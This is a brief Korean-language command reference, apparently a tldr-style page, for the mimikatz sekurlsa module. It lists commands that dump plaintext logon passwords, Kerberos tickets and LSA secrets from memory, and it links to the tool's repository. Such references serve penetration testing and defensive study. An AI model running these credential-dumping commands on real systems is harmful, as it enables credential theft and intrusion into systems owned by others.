# mimikatz sekurlsa

메모리에서 자격 증명과 비밀 정보를 추출. 디버그 권한이 필요.

## Usage
- `mimikatz "sekurlsa::logonpasswords"` : 평문 비밀번호 추출
- `mimikatz "sekurlsa::tickets"` : 메모리에 저장된 Kerberos 티켓 목록 표시
- `mimikatz "sekurlsa::secrets"` : LSA 비밀 정보 덤프

## Links
- More information: https://github.com/gentilkiwi/mimikatz
